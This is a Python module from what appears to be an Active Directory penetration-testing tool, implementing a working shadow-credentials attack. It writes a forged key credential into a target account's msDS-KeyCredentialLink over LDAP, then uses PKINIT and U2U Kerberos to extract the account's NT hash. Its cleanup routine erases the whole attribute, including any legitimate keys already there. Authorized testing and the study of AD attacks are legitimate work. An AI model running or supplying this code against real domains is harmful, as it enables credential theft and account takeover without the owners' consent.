"""Standalone native shadow credentials helpers for ESC9/ESC14."""
from __future__ import annotations

import base64
import urllib.parse
from dataclasses import dataclass
from typing import Optional

from adscan_internal import telemetry
from adscan_internal.rich_output import print_info, print_success, print_warning
from adscan_internal.services.ldap_transport_service import ADscanLDAPConfig, ADscanLDAPConnection
from adscan_core.rich_output import print_exception


@dataclass
class ShadowCredsResult:
    success: bool
    nt_hash: Optional[str] = None
    error: Optional[str] = None


def add_shadow_credentials_native(
    *,
    dc_ip: str,
    domain: str,
    username: str,
    password: str,
    target_account: str,
) -> ShadowCredsResult:
    """Add msDS-KeyCredentialLink to target_account and get NT hash via PKINIT.

    Synchronous — call via ``asyncio.to_thread`` from async contexts.
    """
    try:
        from badldap.commons.keycredential import KeyCredential
        from kerbad.common import factory as kerberos_factory
        from kerbad.protocol.external import ticketutil
    except Exception as exc:
        return ShadowCredsResult(success=False, error=f"Import error: {exc}")

    try:
        cfg = ADscanLDAPConfig(
            domain=domain,
            dc_ip=dc_ip,
            use_ldaps=False,
            use_kerberos=False,
            username=username,
            password=password,
        )
        with ADscanLDAPConnection(cfg) as conn:
            # Resolve target DN
            conn.search(
                search_base=conn.domain_dn,
                search_filter=f"(sAMAccountName={target_account})",
                attributes=["distinguishedName", "sAMAccountName", "msDS-KeyCredentialLink"],
            )
            if not conn.entries:
                return ShadowCredsResult(
                    success=False,
                    error=f"Target account {target_account!r} not found via LDAP",
                )
            entry = conn.entries[0]
            target_dn = entry.dn
            attrs = entry.entry_attributes_as_dict
            target_sam = (attrs.get("sAMAccountName") or [target_account])[0] or target_account
            current_keys = [
                str(v)
                for v in (attrs.get("msDS-KeyCredentialLink") or [])
                if str(v).strip()
            ]

            print_info(f"ESC9: adding shadow credentials to {target_account}...")
            cert_subject = str(target_sam).strip().strip("$")[:64]
            key_credential = KeyCredential.generate_self_signed_certificate(
                cert_subject or "adscan-shadow"
            )
            current_keys.append(key_credential.toDNWithBinary2String(target_dn))
            if not conn.modify(
                target_dn,
                {"msDS-KeyCredentialLink": [("replace", current_keys)]},
            ):
                return ShadowCredsResult(
                    success=False,
                    error="LDAP modify of msDS-KeyCredentialLink failed",
                )

        # PKINIT to get NT hash
        pfx_b64 = urllib.parse.quote(
            base64.b64encode(key_credential.to_pfx_data()).decode("utf-8"),
            safe="",
        )
        kerberos_url = (
            f"kerberos+pfxstr://{domain}\\{target_sam}@{dc_ip}/"
            f"?certdata={pfx_b64}&timeout=350"
        )
        factory = kerberos_factory.KerberosClientFactory.from_url(kerberos_url)
        client = factory.get_client_blocking()
        _tgs, _enctgs, _key, decrypted = client.with_clock_skew(client.U2U)
        for principal, nt_hash in ticketutil.get_NT_from_PAC(client.pkinit_tkey, decrypted):
            if str(nt_hash or "").strip():
                print_success(f"ESC9: shadow credentials → NT hash obtained for {principal}")
                return ShadowCredsResult(success=True, nt_hash=str(nt_hash).strip())

        return ShadowCredsResult(
            success=False,
            error="PKINIT succeeded but no NT hash extracted from PAC",
        )

    except Exception as exc:
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return ShadowCredsResult(success=False, error=f"{type(exc).__name__}: {exc}")


def remove_shadow_credentials_native(
    *,
    dc_ip: str,
    domain: str,
    username: str,
    password: str,
    target_account: str,
) -> bool:
    """Clear msDS-KeyCredentialLink on target_account.

    Synchronous — call via ``asyncio.to_thread`` from async contexts.
    Returns True on success.
    """
    try:
        cfg = ADscanLDAPConfig(
            domain=domain,
            dc_ip=dc_ip,
            use_ldaps=False,
            use_kerberos=False,
            username=username,
            password=password,
        )
        with ADscanLDAPConnection(cfg) as conn:
            conn.search(
                search_base=conn.domain_dn,
                search_filter=f"(sAMAccountName={target_account})",
                attributes=["distinguishedName"],
            )
            if not conn.entries:
                print_warning(f"ESC9 cleanup: account {target_account!r} not found — skipping")
                return True
            target_dn = conn.entries[0].dn
            return bool(
                conn.modify(target_dn, {"msDS-KeyCredentialLink": [("replace", [])]})
            )
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return False
